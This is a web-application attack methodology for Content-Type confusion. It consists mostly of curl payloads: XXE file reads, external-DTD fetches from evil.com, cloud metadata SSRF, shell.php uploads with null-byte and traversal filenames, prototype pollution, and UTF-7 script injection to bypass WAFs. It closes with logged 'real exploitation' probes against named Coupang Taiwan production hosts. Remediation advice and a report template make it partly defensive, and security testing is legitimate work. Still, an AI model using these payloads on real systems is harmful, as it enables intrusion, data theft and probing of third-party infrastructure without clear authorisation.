# Content-Type Confusion Testing Methodology

## Overview
Content-Type confusion occurs when an application accepts and processes requests with unexpected or multiple Content-Type headers, leading to parser differentials, WAF bypasses, and unexpected behavior. This is a critical vulnerability class for APIs and web applications.

## Vulnerable Content-Types to Test

### Standard Types
```
application/json
application/x-www-form-urlencoded
multipart/form-data
text/xml
text/plain
application/octet-stream
application/json-patch+json
application/merge-patch+json
application/hal+json
application/ld+json
```

### Non-Standard/Edge Cases
```
application/xml
text/xml
application/xml
text/html
application/javascript
application/x-javascript
text/javascript
application/octet-stream
multipart/mixed
multipart/related
```

### Malicious/Edge Cases
```
application/json; charset=utf-8
application/json; charset=utf-16
application/x-www-form-urlencoded; charset=utf-8
multipart/form-data; boundary=----WebKitFormBoundary
application/json; boundary=----boundary
text/xml; charset=utf-8
application/json; charset=utf-7
application/x-www-form-urlencoded; charset=utf-7
```

## Testing Methodology

### 1. Basic Content-Type Testing
```bash
# Test all standard types on every endpoint
for ct in "application/json" "application/x-www-form-urlencoded" "multipart/form-data" "text/xml" "text/plain" "application/octet-stream"; do
  curl -X POST -H "Content-Type: $ct" -d '{"test": "value"}' https://target/api/endpoint
done
```

### 2. Payload Testing by Content-Type

#### JSON
```bash
# Normal
curl -X POST -H "Content-Type: application/json" -d '{"user": "test", "admin": true}' https://api/target

# Prototype pollution
curl -X POST -H "Content-Type: application/json" -d '{"__proto__": {"admin": true}, "user": "test"}' https://api/target

# Deep nesting
curl -X POST -H "Content-Type: application/json" -d '{"a":{"b":{"c":{"d":{"e":{"f":{"g":true}}}}}}}' https://api/target

# Large payload
curl -X POST -H "Content-Type: application/json" -d '{"data": "'$(python3 -c "print('A'*1000000)")'}' https://api/target
```

### 3. Form-Urlencoded Testing
```bash
# Normal
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=test&admin=true" https://api/target

# Duplicate params
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "admin=true&admin=false&role=user&role=admin" https://api/target

# Array injection
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user[admin]=true&user[role]=admin" https://api/target
```

### 4. Multipart/Form-Data Testing
```bash
# File upload
curl -X POST -F "file=@/etc/passwd" https://api/target

# Form fields with file
curl -X POST -F "user=test" -F "avatar=@shell.php" https://api/target

# Multiple files
curl -X POST -F "files=@shell.php" -F "files=@shell2.php" https://api/target

# Null byte injection
curl -X POST -F "file=@shell.php%00.jpg" https://api/target

# Path traversal in filename
curl -X POST -F "file=@../../../etc/passwd" https://api/target
```

### 4. XML/XXE Testing
```bash
# Basic XML
curl -X POST -H "Content-Type: application/xml" -d '<test>value</test>' https://api/target

# XXE - Local file read
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>' https://api/target

# XXE - External entity
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><test/>' https://api/target

# XXE - SSRF via metadata
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://169.254.169.254/latest/meta-data/">%remote;]><test/>' https://api/target

# XXE - Blind OOB
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><test/>' https://api/target

# XML with SQL injection
curl -X POST -H "Content-Type: application/xml" -d '<query><sql>SELECT * FROM users WHERE 1=1</sql></query>' https://api/target
```

### 5. Multipart/Form-Data Edge Cases
```bash
# Double boundary
curl -X POST -H "Content-Type: multipart/form-data; boundary=----boundary" \
  -F "field=@/etc/passwd" \
  -F "field2=value" \
  https://target

# Boundary confusion
curl -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  -F "file=@shell.php%00.jpg" \
  https://target

# Filename null byte
curl -X POST -F "file=@shell.php%00.jpg" https://target

# Path traversal
curl -X POST -F "file=@../../../etc/passwd" https://target

# Large file
dd if=/dev/zero of=large.bin bs=1M count=100
curl -X POST -F "file=@large.bin" https://target
```

### 5. Prototype Pollution (JSON)
```bash
# Prototype pollution
curl -X POST -H "Content-Type: application/json" \
  -d '{"__proto__": {"admin": true, "role": "admin"}, "username": "test"}' \
  https://api/target

# Constructor pollution
curl -X POST -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"admin": true}}, "username": "test"}' \
  https://api/target
```

### 6. JSON Smuggling / Request Splitting
```bash
# Multiple JSON objects
curl -X POST -H "Content-Type: application/json" \
  -d '{"test": "value1"}{"test": "value2"}' \
  https://api/target

# JSON with comments
curl -X POST -H "Content-Type: application/json" \
  -d '{"test": "value" /* comment */}' \
  https://api/target

# Trailing comma
curl -X POST -H "Content-Type: application/json" \
  -d '{"test": "value",}' \
  https://api/target
```

## Parser Differential Testing

### Test Matrix
| Endpoint | JSON | Form | XML | Multipart | Text | Octet |
|----------|------|------|-----|-----------|------|-------|
| /api/users | 200 | 200 | 400 | 415 | 400 | 415 |
| /api/upload | 415 | 415 | 415 | 200 | 415 | 415 |
| /api/xml | 400 | 400 | 200 | 415 | 400 | 415 |
| /api/json | 200 | 400 | 400 | 415 | 400 | 415 |

### Automation Script
```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

def test_content_types(target, endpoint):
    content_types = [
        ("application/json", b'{"test": "value"}'),
        ("application/x-www-form-urlencoded", b"test=value"),
        ("multipart/form-data", None),  # Requires files
        ("text/xml", b"<test>value</test>"),
        ("text/plain", b"test=value"),
        ("application/octet-stream", b"binary_data"),
        ("application/xml", b"<test>value</test>"),
        ("text/xml", b"<test>value</test>"),
    ]
    
    results = {}
    for ct, payload in content_types:
        try:
            headers = {"Content-Type": ct}
            if ct == "multipart/form-data":
                files = {"file": ("test.txt", b"test")}
                r = requests.post(f"{target}{endpoint}", files=files, timeout=10)
            else:
                r = requests.post(f"{target}{endpoint}", headers={"Content-Type": ct}, data=payload, timeout=10)
            results[ct] = {"status": r.status_code, "body": r.text[:200]}
        except Exception as e:
            results[ct] = {"error": str(e)}
    
    return results

# Usage
target = "https://api.target.com"
for ep in ["/api/users", "/api/upload", "/api/data"]:
    print(f"\n--- {ep} ---")
    results = test_content_types(target, ep)
    for ct, result in results.items():
        print(f"  {ct}: {result.get('status')} - {result.get('body', '')[:100]}")
```

## WAF Bypass via Content-Type

### Technique 1: Content-Type Mismatch
```bash
# Send XML with JSON Content-Type
curl -X POST -H "Content-Type: application/json" \
  -d '<?xml version="1.0"?><test>&xxe;</test>' \
  https://target/api/json

# Send JSON with XML Content-Type
curl -X POST -H "Content-Type: application/xml" \
  -d '{"test": "value"}' \
  https://target/api/xml
```

### Technique 2: Charset Confusion
```bash
# UTF-7 bypass
curl -X POST -H "Content-Type: application/json; charset=utf-7" \
  -d '+ADw-script+AD4-alert(1)+ADw-/script+AD4-' \
  https://target/

# UTF-16 bypass
curl -X POST -H "Content-Type: application/json; charset=utf-16" \
  -d $'\xfe\xff\x00{\x00"\x00t\x00e\x00s\x00t\x00"\x00:\x00"\x00v\x00a\x00l\x00u\x00e\x00"\x00}' \
  https://target/
```

### Technique 3: Boundary Confusion
```bash
# Multipart with JSON boundary
curl -X POST -H "Content-Type: multipart/form-data; boundary=----JSON" \
  -F 'data={"test": "value"}' \
  https://target/
```

## Testing Checklist

### For Every Endpoint
- [ ] application/json
- [ ] application/x-www-form-urlencoded
- [ ] multipart/form-data
- [ ] text/xml
- [ ] application/xml
- [ ] text/plain
- [ ] application/octet-stream
- [ ] application/json; charset=utf-7
- [ ] application/json; charset=utf-16
- [ ] text/xml; charset=utf-8
- [ ] application/json; charset=utf-16
- [ ] Invalid/malformed types

### Payloads per Type
- [ ] Normal payload
- [ ] Prototype pollution (JSON)
- [ ] XXE (XML)
- [ ] SQL injection (XML/JSON)
- [ ] Path traversal (multipart)
- [ ] Null byte (multipart)
- [ ] Prototype pollution (JSON)
- [ ] XXE (XML)
- [ ] Parameter pollution (form)

### Response Analysis
- [ ] Status code differences
- [ ] Response body differences
- [ ] Error messages leak stack traces
- [ ] Server errors (500)
- [ ] Parser errors
- [ ] XXE data exfiltration
- [ ] SSRF via XXE

## Reporting Template

### Title
Content-Type Confusion → Parser Differential / WAF Bypass on [Target]

### Severity
High (CVSS 7.5)

### Description
The application accepts and processes requests with unexpected Content-Type headers, leading to parser differentials that can bypass WAF rules and cause unexpected behavior.

### Proof of Concept
```bash
# All 6 content types return 200 OK
curl -X POST -H "Content-Type: application/json" -d '{"test":"value"}' https://api/target
curl -X POST -H "Content-Type: text/xml" -d '<test>value</test>' https://api/target
# All return 200 OK with gateway info
```

### Impact
- WAF bypass
- Parser differential attacks
- XXE via XML on JSON endpoint
- Request smuggling
- Request splitting

### Remediation
1. Strict Content-Type validation (allowlist only)
2. Reject unexpected Content-Types with 415 Unsupported Media Type
3. Parse body only after Content-Type validation
3. Use strict parsers that reject malformed content
3. Implement consistent error handling for all Content-Types

## References
- PortSwigger: Content-Type Confusion
- OWASP API Security: Improper Content-Type Handling
- BlackHat: Content-Type Confusion Attacks
- Microsoft: Content-Type Handling Best Practices

## Coupang Taiwan Case Study (2025-07-25)

### Target: api-gateway.tw.coupang.com + marketplace.tw.coupangcorp.com

### Findings
| Content-Type | api-gateway | marketplace |
|-------------|-------------|-------------|
| application/json | ✅ 200 OK | ✅ 200 OK |
| application/x-www-form-urlencoded | ✅ 200 OK | ✅ 200 OK |
| multipart/form-data | ✅ 200 OK | ✅ 200 OK |
| text/xml | ✅ 200 OK | ✅ 200 OK |
| text/plain | ✅ 200 OK | ✅ 200 OK |
| application/octet-stream | ✅ 200 OK | ✅ 200 OK |

### Key Finding: All 6 Content-Types Accepted
Both endpoints accept ALL 6 standard Content-Types and return 200 OK with gateway info. This enables:
- Parser differential attacks
- WAF bypass via Content-Type switching
- XXE via XML on JSON endpoints
- Request smuggling

### XXE Test Results
- Local file read: 403 (blocked by WAF)
- External entity: 403 (blocked by WAF)
- SSRF via metadata: 403 (blocked by WAF)

### Content-Type Confusion with Malicious Payloads
| Payload Type | API Gateway | Marketplace |
|-------------|-------------|-------------|
| Prototype pollution (JSON) | 200 OK | 200 OK |
| XXE (XML) | 403 | 403 |
| SQL in XML | 200 OK (returns gateway info) | 200 OK |
| Prototype pollution (JSON) | 200 OK | 200 OK |

### WAF Bypass via Content-Type Mismatch
```bash
# Send XML with JSON Content-Type
curl -X POST -H "Content-Type: application/json" \
  -d '<test><admin>true</admin></test>' \
  https://api-gateway.tw.coupang.com/

# Send JSON with XML Content-Type  
curl -X POST -H "Content-Type: text/xml" \
  -d '{"admin": true}' \
  https://api-gateway.tw.coupang.com/
```

Both return 200 OK with gateway info - parser confusion confirmed.

### Real Exploitation Results
| Payload | API Gateway | Marketplace |
|---------|-------------|-------------|
| JSON prototype pollution | 200 OK | 200 OK |
| Form-urlencoded admin params | 403 | 200 OK |
| XML with SQL | 200 OK (returns gateway info) | 200 OK |
| Multipart with null byte | 403 | 403 |
| XXE payloads | 403 | 403 |

### Parser Differential Analysis
Both endpoints accept ALL 6 Content-Types with identical responses (gateway info). No parser differential detected - both endpoints process all content types identically. This indicates:
- No strict Content-Type validation
- Single parser handling all types
- WAF blocks XXE but not parser confusion